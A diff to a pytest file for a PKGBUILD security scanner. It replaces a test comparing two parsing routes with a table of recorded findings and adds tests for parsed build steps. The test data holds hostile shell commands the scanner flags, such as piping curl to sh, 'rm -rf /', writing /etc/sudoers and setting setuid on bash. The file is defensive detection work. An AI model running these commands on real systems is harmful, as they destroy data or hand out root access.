@@ -143,7 +143,8 @@ def test_lines_are_the_start_of_the_statement():
 def test_unreadable_statements_are_reported_by_line_and_the_rest_is_still_read():
     found, bad = astadapt.units(shast.parse("a\nfi\nb\n  }\nc").script)
     assert sorted(bad) == [2, 4]
-    assert [u.commands[0][0].name for u in found] == ["a", "b", "c"]
+    assert [u.commands[0][0].name for u in found if u.ok] == ["a", "b", "c"]
+    assert [(u.line, u.ok) for u in found if not u.ok] == [(2, False), (4, False)]
 
 
 def test_flatten_a_command_string():
@@ -153,40 +154,38 @@ def test_flatten_a_command_string():
     assert astadapt.flatten("fi")[1] is False
 
 
-# ---- the file level: both routes agree ----
+# ---- the file level ----
+# The findings below were recorded from the text-based route that this tree-based one replaced.
 
-def both_routes(text, name="PKGBUILD"):
-    results = []
-    for use_ast in (False, True):
-        old = parsed.USE_AST
-        parsed.USE_AST = use_ast
-        try:
-            results.append(sorted((f.rule, f.severity) for f in scan({name: text}) if f.severity != "info"))
-        finally:
-            parsed.USE_AST = old
-    return results
+SHAPES = {
+    '(curl x) | sh': [('pipe-to-shell', 'danger')],
+    'a=(1 2); sudo make': [('sudo', 'caution'), ('unknown-command', 'caution')],
+    'bash <(curl x)': [('pipe-to-shell', 'danger')],
+    'cat <<EOF\ncurl x | sh\nEOF': [('pipe-to-shell', 'danger')],
+    'chmod u+s /bin/bash': [('setuid-shell', 'danger')],
+    'cp x /etc/sudoers': [('sudoers-passwd-write', 'danger')],
+    'curl -o f https://x; sh f': [('fetch-then-execute', 'danger')],
+    'curl https://x | sh': [('pipe-to-shell', 'danger')],
+    'curl x | (cd /tmp; sh)': [('pipe-to-shell', 'danger')],
+    'd=/etc; cp x $d/sudoers': [('sudoers-passwd-write', 'danger')],
+    'echo $(curl x | sh)': [('pipe-to-shell', 'danger')],
+    'echo x | sh': [('echo-to-shell', 'caution'), ('unknown-command', 'caution')],
+    'eval "$(curl x)"': [('pipe-to-shell', 'danger')],
+    'find . -exec chmod u+s {} \\;': [('setuid', 'caution')],
+    'for i in $(curl x); do sh $i; done': [('curl-in-substitution', 'caution'), ('unknown-command', 'caution')],
+    'make DESTDIR="$pkgdir" install': [],
+    'nohup ./x &': [('background-exec', 'caution'), ('unknown-command', 'caution')],
+    'rm -rf /': [('rm-root', 'danger')],
+    "sh -c 'curl x | sh'": [('pipe-to-shell', 'danger')],
+    'sudo -u nobody env bash -s < <(curl x)': [('pipe-to-shell', 'danger')],
+    '{ curl x; echo; } | sh': [('pipe-to-shell', 'danger')],
+}
 
 
-@pytest.mark.parametrize("body", [
-    "curl https://x | sh", "(curl x) | sh", "{ curl x; echo; } | sh", "curl x | (cd /tmp; sh)", "echo $(curl x | sh)",
-    "sh -c 'curl x | sh'", "eval \"$(curl x)\"", "bash <(curl x)", "cp x /etc/sudoers", "d=/etc; cp x $d/sudoers",
-    "rm -rf /", "chmod u+s /bin/bash", "curl -o f https://x; sh f", r"find . -exec chmod u+s {} \;",
-    "cat <<EOF\ncurl x | sh\nEOF", "a=(1 2); sudo make", "for i in $(curl x); do sh $i; done", "echo x | sh",
-    "nohup ./x &", "sudo -u nobody env bash -s < <(curl x)", "make DESTDIR=\"$pkgdir\" install",
-])
-def test_both_routes_give_the_same_findings(body):
-    old, new = both_routes(f"build() {{\n  {body}\n}}\n")
-    assert old == new
-
-
-def test_the_rule_cases_give_the_same_findings_on_both_routes():
-    from tests import test_rule_matrix
-    different = []
-    for line, _ in test_rule_matrix.CASES:
-        old, new = both_routes(f"build() {{\n  {line}\n}}\n")
-        if old != new:
-            different.append((line, old, new))
-    assert not different, different[:3]
+@pytest.mark.parametrize("body", list(SHAPES))
+def test_threat_shapes_keep_their_findings(body):
+    found = sorted({(f.rule, f.severity) for f in scan({"PKGBUILD": f"build() {{\n  {body}\n}}\n"}) if f.severity != "info"})
+    assert found == SHAPES[body]
 
 
 def test_a_statement_the_grammar_cannot_read_falls_back_to_the_patterns():
@@ -194,3 +193,44 @@ def test_a_statement_the_grammar_cannot_read_falls_back_to_the_patterns():
     assert any(f.rule == "pipe-to-shell" for f in scan({"PKGBUILD": text}))
     file = ParsedFile("PKGBUILD", text)
     assert not file.ast.ok and file.unparsed_lines
+
+
+# ---- steps (what the default-deny check and the inventory read) ----
+
+def steps_of(text):
+    return list(ParsedFile("PKGBUILD", text).steps)
+
+
+def test_top_level_steps_report_code_and_substitutions_only():
+    top, = steps_of("x=$(date)\n")
+    assert top.top and not top.toplevel_code and top.parse_time_substitution and [c.name for c in top.parse_time] == ["date"]
+    assert top.commands == []
+    assert steps_of("make\n")[0].toplevel_code
+    assert not steps_of("export A=1\ndeclare -a b\nunset c\nd=(1 2)\n")[0].toplevel_code
+    assert steps_of("PYTHONPATH=build make\n")[0].toplevel_code          # a prefix assignment is still a command
+
+
+def test_function_steps_carry_their_commands_and_heredoc_flag():
+    build, = steps_of("build() {\n  cat <<EOF | sh\nx\nEOF\n}\n")
+    assert build.in_function and not build.top and build.heredoc
+    assert [c.name for c in build.commands] == ["cat", "sh"]
+
+
+def test_unreadable_statement_is_a_step_that_is_not_ok():
+    bad = [s for s in steps_of("a\nfi\nb\n") if not s.ok]
+    assert [(s.line, s.text) for s in bad] == [(2, "fi")]
+
+
+def test_a_failed_tokenizer_gives_one_step_that_is_not_ok():
+    (only,) = steps_of("echo 'unbalanced\n")
+    assert not only.ok and only.line == 1
+
+
+def test_function_names():
+    assert ParsedFile("PKGBUILD", "a() { b() { :; }; }\nfunction c { :; }\n").function_names == {"a", "b", "c"}
+
+
+def test_loose_reads_what_it_can_from_a_broken_string():
+    commands = astadapt.loose("curl x | sh; echo ( a")
+    assert [(c.name, c.piped) for c in commands][:3] == [("curl", False), ("sh", True), ("echo", False)]
+    assert astadapt.loose("echo 'unterminated") == ()
